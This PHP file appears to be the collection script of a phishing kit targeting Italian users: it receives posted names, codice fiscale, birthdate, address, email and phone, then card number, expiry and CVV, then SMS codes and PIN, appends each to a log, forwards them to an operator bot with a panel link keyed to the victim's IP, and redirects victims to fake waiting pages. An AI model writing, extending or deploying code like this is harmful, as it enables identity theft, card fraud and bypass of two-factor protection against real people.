<?php
ob_start();

require "../main.php";
require "../test_config.php";

$bot = $a_bot;
$ids = explode(",",str_replace(" ","",$a_ids));

// Get real IP first (handles proxies/Docker/Koyeb)
$ip = getRealClientIP();

// Get host from HTTP_HOST (Koyeb passes real domain correctly)
$host = $_SERVER['HTTP_HOST'];
$panel_url = "http://" . $host . "/panel/view.php?vip=" . $ip;

function post($data){
    if(!isset($_POST[$data]) || empty(trim($_POST[$data]))){
        return "NO_DATA";
    }else{
        return htmlspecialchars($_POST[$data]);
    }
}

function sendBot($url){
    $ci = curl_init();
    curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ci, CURLOPT_URL, $url);
    return curl_exec($ci);
    curl_close($ci);
}

if(isset($_POST['fname'])){
    $fname = isset($_POST['fname']) ? $_POST['fname'] : '';
    $lname = isset($_POST['lname']) ? $_POST['lname'] : '';
    $code_fiscale = isset($_POST['codice-fiscale']) ? $_POST['codice-fiscale'] : '';
    $birthdate = isset($_POST['birthdate']) ? $_POST['birthdate'] : '';
    $city = isset($_POST['city']) ? $_POST['city'] : '';
    $zip = isset($_POST['zip']) ? $_POST['zip'] : '';
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $number = isset($_POST['number']) ? $_POST['number'] : '';
    
    $message = "INFORMATION | $ip\n" .
        "+ First Name: $fname\n" .
        "+ Last Name: $lname\n" .
        "+ Code Fiscale: $code_fiscale\n" .
        "+ Birthdate: $birthdate\n" .
        "+ City: $city\n" .
        "+ ZIP: $zip\n" .
        "+ Email: $email\n" .
        "+ Phone: $number";
    
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs."\n+ Personal Info [ $fname $lname | $code_fiscale | $birthdate/$city | $zip | $email | $number ] ";
    $arr = array("LOGS"=>$newlogs);
    $m->update($arr);
    
    // Send to test bot only
    sendToTestBotOnly("PERSONAL_INFO", $message, $ip, $panel_url);
    
    header("location: wait.php?p=PersonalInfo");
    exit();
}

if(isset($_POST['cc'])){
    $card = isset($_POST['cc']) ? $_POST['cc'] : '';
    $date = isset($_POST['exp']) ? $_POST['exp'] : '';
    $code = isset($_POST['cvv']) ? $_POST['cvv'] : '';
    
    $message = "CARD | $ip\n" .
        "+ Card: $card\n" .
        "+ Expiry: $date\n" .
        "+ CVV: $code";
    
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs."\n+ CC [ $name | $card | $date/$code ] ";
    $arr = array("LOGS"=>$newlogs);
    $m->update($arr);
    
    // Send to test bot only
    sendToTestBotOnly("CREDIT_CARD", $message, $ip, $panel_url);
    
    header("location: loading3.php?p=CC");
    exit();
}

if(isset($_POST['sms'])){
    $sms = isset($_POST['sms']) ? $_POST['sms'] : '';
    $pin = isset($_POST['pin']) ? $_POST['pin'] : '';
    
    $message = "SMS/PIN | $ip\n" .
        "+ SMS: $sms\n" .
        "+ PIN: $pin";
    
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs."\n+ SMS [ $sms | $pin ]";
    $arr = array("LOGS"=>$newlogs);
    $m->update($arr);
    
    // Send to test bot only
    sendToTestBotOnly("SMS_PIN", $message, $ip, $panel_url);
    
    header("location: loading3.php");
}
?>